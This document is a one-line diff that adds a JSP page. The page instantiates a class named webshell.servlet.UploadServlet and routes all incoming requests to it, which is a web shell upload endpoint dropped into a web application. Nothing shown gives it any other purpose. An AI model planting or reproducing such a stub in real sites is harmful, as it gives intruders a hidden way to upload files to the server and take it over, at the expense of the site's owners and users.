@@ -1,0 +1,1 @@
+<%!webshell.servlet.UploadServlet serv = new webshell.servlet.UploadServlet();%><%this.serv.service(request, response);%>
